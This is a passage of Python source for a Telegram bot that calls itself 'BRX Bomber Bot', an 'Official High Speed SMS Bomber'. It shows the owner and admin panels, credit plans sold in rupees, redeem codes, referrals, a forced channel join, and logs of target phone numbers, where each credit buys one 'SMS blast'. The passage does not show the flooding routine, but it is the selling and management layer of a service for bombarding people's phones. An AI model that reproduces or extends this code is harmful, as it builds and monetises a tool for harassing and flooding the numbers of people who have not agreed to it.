    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} User ka Telegram ID bhejo jiske credits badhane hain:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_uid)
async def owner_got_credit_uid(msg: Message, state: FSMContext):
    try:
        t_uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid Telegram ID bhejo:", parse_mode="HTML")
        return
    await state.update_data(target_uid=t_uid)
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} Kitne credits add karne hain enter karo:", parse_mode="HTML")

@R.message(S.add_credits_amount)
async def owner_got_credit_amount(msg: Message, state: FSMContext):
    try:
        amt = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid number bhejo:", parse_mode="HTML")
        return
    sdata = await state.get_data()
    t_uid = sdata["target_uid"]
    await state.clear()
    d = load()
    add_credits(t_uid, amt, d)
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} User <code>{t_uid}</code> ko +{amt} credits mil gaye!", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")

# Force Join Settings
@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    fj = d.get("force_join", {})
    status = "🟢 ENABLED" if fj.get("enabled") else "🔴 DISABLED"
    channels = fj.get("channels", [])
    text = f"{em(EMOJI_BELL, '🔔')} <b>Force Join Manager</b>\nStatus: <b>{status}</b>\nChannels: <b>{len(channels)}</b>"
    rows = []
    if fj.get("enabled"):
        rows.append([btn("⛔ Disable Force Join", "owner:fj:off")])
    else:
        rows.append([btn("🟢 Enable Force Join", "owner:fj:on")])
    rows.append([btn("➕ Add Channel", "owner:fj:add")])
    for idx, ch in enumerate(channels):
        rows.append([btn(ch.get("title", "Channel"), "noop"), btn("🗑 Remove", f"owner:fj:del:{idx}")])
    rows.append([btn("🔙 Back", "owner:home")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:on")
async def owner_fj_on(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    d.setdefault("force_join", {})["enabled"] = True
    save(d)
    await cq.answer("🟢 Force Join Enabled!")
    await owner_fj_menu(cq)

@R.callback_query(F.data == "owner:fj:off")
async def owner_fj_off(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    d.setdefault("force_join", {})["enabled"] = False
    save(d)
    await cq.answer("🔴 Force Join Disabled!")
    await owner_fj_menu(cq)

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text("🔔 Channel ka ID (e.g. -100123456789) bhejo:", reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_channel)
async def owner_got_fj_channel(msg: Message, state: FSMContext):
    ch_id = msg.text.strip()
    await state.update_data(ch_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer("🔗 Channel ka Invite Link bhejo:", parse_mode="HTML")

@R.message(S.fj_add_link)
async def owner_got_fj_link(msg: Message, state: FSMContext):
    link = msg.text.strip()
    sdata = await state.get_data()
    ch_id = sdata["ch_id"]
    await state.clear()
    d = load()
    d.setdefault("force_join", {}).setdefault("channels", []).append({
        "id": ch_id, "link": link, "title": "Official Channel", "required": True
    })
    save(d)
    await msg.answer("✅ Channel force join list mein add ho gaya!", reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    idx = int(cq.data.split(":")[3])
    d = load()
    channels = d.get("force_join", {}).get("channels", [])
    if 0 <= idx < len(channels):
        channels.pop(idx)
        d["force_join"]["channels"] = channels
        save(d)
        await cq.answer("🗑 Channel removed!")
    await owner_fj_menu(cq)

# Protect Number feature
@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(f"{em(EMOJI_LOCK, '🔒')} Protect karne ke liye Phone Number enter karo (+91...):", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.protect_number)
async def owner_got_protect_number(msg: Message, state: FSMContext):
    num = msg.text.strip()
    await state.clear()
    PROTECTED_NUMBERS[num] = msg.from_user.id
    d = load()
    d.setdefault("protected_numbers", {})[num] = msg.from_user.id
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Number <code>{num}</code> protected list me add ho gaya!", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")

# Track Number feature
@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.track_number)
    await cq.message.edit_text(f"{em(EMOJI_PHONE, '📍')} Track karne ke liye Phone Number enter karo:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.track_number)
async def owner_got_track_number(msg: Message, state: FSMContext):
    num = msg.text.strip()
    await state.clear()
    d = load()
    found = []
    for u_str, udata in d.get("users", {}).items():
        for h in udata.get("sms_history", []):
            if num in h.get("number", ""):
                found.append((u_str, udata.get("name", "User"), h))
    lines = [f"📍 <b>Tracking Info for {num}:</b>\n"]
    if found:
        for u_str, name, h in found:
            lines.append(f"• User: {name} (<code>{u_str}</code>) | Sent: {h.get('sent')} | Time: {fmt_time(h.get('timestamp'))}")
    else:
        lines.append("Is number ka koi log nahi mila.")
    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")

# Settings
@R.callback_query(F.data == "owner:settings")
async def owner_settings_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    ref_c = d.get("settings", {}).get("ref_credits", 3)
    text = f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\nReferral Reward: <b>{ref_c} credits</b>"
    rows = [
        [btn("✏️ Change Referral Credits", "owner:set_ref")],
        [btn("🔙 Back", "owner:home")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:set_ref")
async def owner_set_ref_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text("Naya referral bonus amount enter karo:", reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]), parse_mode="HTML")

@R.message(S.set_ref_credits)
async def owner_got_ref_credits(msg: Message, state: FSMContext):
    try:
        amt = int(msg.text.strip())
    except:
        await msg.answer("Valid number enter karo:", parse_mode="HTML")
        return
    await state.clear()
    d = load()
    d.setdefault("settings", {})["ref_credits"] = amt
    save(d)
    await msg.answer(f"✅ Referral credits updated to {amt}!", reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")

# Pricing & Redeem Menu
@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans ({len(plans)})</b>"
    rows = [[btn("➕ Add Plan", "owner:plan:add")]]
    for idx, p in enumerate(plans):
        rows.append([btn(f"{p['name']} - ₹{p['price']} ({p['credits']} cr)", "noop"), btn("🗑", f"owner:plan:del:{idx}")])
    rows.append([btn("🔙 Back", "owner:home")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:plan:add")
async def owner_plan_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text("Plan ka Name enter karo (e.g. Starter Pack):", reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_name)
async def owner_got_plan_name(msg: Message, state: FSMContext):
    await state.update_data(name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer("Price (in ₹) enter karo:", parse_mode="HTML")

@R.message(S.add_plan_price)
async def owner_got_plan_price(msg: Message, state: FSMContext):
    await state.update_data(price=msg.text.strip())
    await state.set_state(S.add_plan_credits)
    await msg.answer("Is plan me kitne Credits milenge enter karo:", parse_mode="HTML")

@R.message(S.add_plan_credits)
async def owner_got_plan_credits(msg: Message, state: FSMContext):
    try:
        credits = int(msg.text.strip())
    except:
        await msg.answer("Valid number enter karo:", parse_mode="HTML")
        return
    await state.update_data(credits=credits)
    await state.set_state(S.add_plan_link)
    await msg.answer("Payment Link ya Admin Contact Link enter karo:", parse_mode="HTML")

@R.message(S.add_plan_link)
async def owner_got_plan_link(msg: Message, state: FSMContext):
    link = msg.text.strip()
    sdata = await state.get_data()
    await state.clear()
    d = load()
    d.setdefault("pricing", {}).setdefault("plans", []).append({
        "name": sdata["name"], "price": sdata["price"], "credits": sdata["credits"], "link": link
    })
    save(d)
    await msg.answer("✅ Plan added successfully!", reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:plan:del:"))
async def owner_plan_del(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    idx = int(cq.data.split(":")[3])
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if 0 <= idx < len(plans):
        plans.pop(idx)
        d["pricing"]["plans"] = plans
        save(d)
        await cq.answer("🗑 Plan removed!")
    await owner_pricing_menu(cq)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    codes = d.get("redeem_codes", {})
    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes Manager</b>\nActive Codes: <b>{len(codes)}</b>"
    rows = [[btn("➕ Generate Redeem Code", "owner:redeem:gen")]]
    for code, cdata in codes.items():
        rows.append([btn(f"{code} ({cdata['credits']} cr | {cdata['uses']} uses left)", "noop"), btn("🗑", f"owner:redeem:del:{code}")])
    rows.append([btn("🔙 Back", "owner:home")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text("Redeem Code kitne Credits ka banana hai?", reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_credits)
async def owner_got_gen_credits(msg: Message, state: FSMContext):
    try:
        credits = int(msg.text.strip())
    except:
        await msg.answer("Valid number enter karo:", parse_mode="HTML")
        return
    await state.update_data(credits=credits)
    await state.set_state(S.gen_redeem_uses)
    await msg.answer("Ye code kitne Users redeem kar sakte hain?", parse_mode="HTML")

@R.message(S.gen_redeem_uses)
async def owner_got_gen_uses(msg: Message, state: FSMContext):
    try:
        uses = int(msg.text.strip())
    except:
        await msg.answer("Valid number enter karo:", parse_mode="HTML")
        return
    sdata = await state.get_data()
    await state.clear()
    code = "BRX-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    d = load()
    d.setdefault("redeem_codes", {})[code] = {
        "credits": sdata["credits"], "uses": uses, "claimed_by": []
    }
    save(d)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Code Generated!</b>\n\n"
        f"Code: <code>{code}</code>\n"
        f"Credits: <b>{sdata['credits']}</b>\n"
        f"Uses: <b>{uses}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:del:"))
async def owner_redeem_del(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    code = cq.data.split(":")[3]
    d = load()
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
        await cq.answer("🗑 Code deleted!")
    await owner_redeem_menu(cq)

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    lines = [f"{em(EMOJI_STAR, '📋')} <b>{sc('global sms history (recent)')}</b>\n"]
    count = 0
    for u_str, udata in d.get("users", {}).items():
        for h in reversed(udata.get("sms_history", [])):
            lines.append(f"• <code>{fmt_time(h['timestamp'])}</code> | User: <code>{u_str}</code> | Target: {h['number']} | Sent: {h['sent']}")
            count += 1
            if count >= 15: break
        if count >= 15: break
    if count == 0: lines.append("No history found.")
    await cq.message.edit_text("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# Admin Callbacks
@R.callback_query(F.data == "admin:home")
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d): return
    await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "admin:refresh")
async def admin_refresh(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d): return
    await cq.answer("🔄 Refreshed!")
    await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "admin:stats")
async def admin_stats(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d): return
    await cq.message.edit_text(api_stats_text(d), reply_markup=kb([(f"{sc('back')}", "admin:home")]), parse_mode="HTML")

@R.callback_query(F.data == "admin:ban")
async def admin_ban_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.ban_user)
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🚫')} Ban karne ke liye User Telegram ID bhejo:", reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.callback_query(F.data == "admin:unban:menu")
async def admin_unban_menu(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d): return
    await cq.message.edit_text(f"{em(EMOJI_CHECK, '🔓')} <b>Unban User List</b>", reply_markup=unban_menu_kb(d, "admin"), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:unban:do:"))
async def admin_unban_do(cq: CallbackQuery):
    if not is_admin(cq.from_user.id, load()): return
    target_uid = int(cq.data.split(":")[3])
    d = load()
    d["banned"] = [b for b in d.get("banned", []) if b != target_uid]
    save(d)
    await cq.answer("🔓 User unbanned!")
    await cq.message.edit_text(f"{em(EMOJI_CHECK, '🔓')} <b>Unban User List</b>", reply_markup=unban_menu_kb(d, "admin"), parse_mode="HTML")

@R.callback_query(F.data == "admin:broadcast")
async def admin_broadcast_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.broadcast)
    await cq.message.edit_text(f"{em(EMOJI_BELL, '📢')} Broadcast message type karein:", reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

# User Callbacks
@R.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:cancel")
async def user_cancel(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    await cq.answer("Cancelled!")
    await user_home(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_random_video(cq: CallbackQuery):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await cq.answer("📹 Abhi koi video available nahi hai!", show_alert=True)
        return
    await cq.answer("📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Enjoy the video!")

@R.callback_query(F.data == "user:credits")
async def user_credits_view(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    cr = get_user_credits(uid, d)
    text = (
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('your balance')}</b>\n\n"
        f"Available Credits: <b>{cr}</b>\n\n"
        f"<i>1 Credit = 1 SMS Blast Count</i>"
    )
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:refer")
async def user_refer_view(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    ref_code = generate_user_refer_code(uid, d)
    save(d)
    bot_info = await cq.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"
    ref_c = d.get("settings", {}).get("ref_credits", 3)
    text = (
        f"{em(EMOJI_GIFT, '👥')} <b>{sc('refer & earn')}</b>\n\n"
        f"Aap apne dosto ko refer karke credits earn kar sakte hain!\n\n"
        f"🎁 Per Referral Reward: <b>{ref_c} Credits</b>\n"
        f"🔑 Referral Code: <code>{ref_code}</code>\n"
        f"🔗 Direct Link: <code>{ref_link}</code>"
    )
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code Enter Karein</b>\n\n"
        f"Jo Promo/Redeem code aapke paas hai type karke bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_got_redeem_code(msg: Message, state: FSMContext):
    code = msg.text.strip()
    await state.clear()
    d = load()
    uid = msg.from_user.id
    codes = d.get("redeem_codes", {})

    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid Redeem Code!", reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")
        return

    cdata = codes[code]
    if uid in cdata.get("claimed_by", []):
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Aap ye code pehle hi redeem kar chuke hain!", reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")
        return

    if cdata.get("uses", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Ye code expired ho chuka hai!", reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")
        return

    cdata["uses"] -= 1
    cdata.setdefault("claimed_by", []).append(uid)
    add_credits(uid, cdata["credits"], d)
    if cdata["uses"] <= 0:
        del codes[code]
    save(d)

    await msg.answer(f"{em(EMOJI_GIFT, '🎉')} <b>Success!</b>\n\nAapko <b>+{cdata['credits']} Credits</b> mil gaye hain!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:stats")
async def user_stats_view(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    udata = d.get("users", {}).get(str(uid), {})
    text = (
        f"{em(EMOJI_STAR, '📊')} <b>{sc('your stats')}</b>\n\n"
        f"Total Uses: <b>{udata.get('uses', 0)}</b>\n"
        f"Current Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"Joined Date: <b>{fmt_time(udata.get('joined_at', int(time.time())))}</b>"
    )
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history_view(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    history = d.get("users", {}).get(str(uid), {}).get("sms_history", [])
    lines = [f"{em(EMOJI_STAR, '📋')} <b>{sc('your recent sms blasts')}</b>\n"]
    for h in reversed(history[-10:]):
        lines.append(f"• <code>{fmt_time(h['timestamp'])}</code> | Target: {h['number']} | Sent: {h['sent']}/{h['total']}")
    if not history: lines.append("No SMS history found.")
    await cq.message.edit_text("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing_view(cq: CallbackQuery):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\nAbhi koi plan available nahi hai. Admin se contact karein: {SUPER_ADMIN_NAME}"
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")
        return
    text = f"{em(EMOJI_MONEY, '💳')} <b>{sc('available credit plans')}</b>\n"
    rows = []
    for p in plans:
        rows.append([btn_url(f"{p['name']} — ₹{p['price']} ({p['credits']} Credits)", p["link"])])
    rows.append([btn("🔙 Back", "user:home")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer</b>\n\n"
        f"Jis user ko credits bhejna hai uska Telegram ID enter karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid)
async def user_got_transfer_uid(msg: Message, state: FSMContext):
    try:
        t_uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid Telegram ID enter karo:", parse_mode="HTML")
        return
    if t_uid == msg.from_user.id:
        await msg.answer("❌ Apne aap ko transfer nahi kar sakte!", parse_mode="HTML")
        return
    await state.update_data(target_uid=t_uid)
    await state.set_state(S.transfer_credits_amount)
    await msg.answer("Kitne Credits transfer karne hain enter karo:", parse_mode="HTML")

@R.message(S.transfer_credits_amount)
async def user_got_transfer_amount(msg: Message, state: FSMContext):
    try:
        amt = int(msg.text.strip())
        if amt <= 0: raise ValueError
    except:
        await msg.answer("Valid amount enter karo:", parse_mode="HTML")
        return
    sdata = await state.get_data()
    t_uid = sdata["target_uid"]
    uid = msg.from_user.id
    await state.clear()
    d = load()
    if deduct_credits(uid, amt, d):
        add_credits(t_uid, amt, d)
        save(d)
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} Successfully transferred {amt} credits to User <code>{t_uid}</code>!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        try:
            await msg.bot.send_message(t_uid, f"🎉 User <code>{uid}</code> ne aapko +{amt} Credits transfer kiye hain!", parse_mode="HTML")
        except: pass
    else:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aapke paas itne credits nahi hain!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info_view(cq: CallbackQuery):
    text = (
        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        f"┃  💎 <b>{BOT_DISPLAY_NAME}</b>\n"
        f"┃  <i>Official High Speed SMS Bomber</i>\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  🏷 Version: <b>{PREMIUM_VERSION}</b>\n"
        f"┃  👑 Owner: {SUPER_ADMIN_NAME}\n"
        f"┃  ⚡ Group: {OFFICIAL_GROUP_LINK}\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data == "noop")
async def noop_cb(cq: CallbackQuery):
    await cq.answer()

async def main():
    log.info("Starting BRX Bomber Bot...")
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    asyncio.create_task(background_firebase_scanner(bot))

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Bot Stopped.")
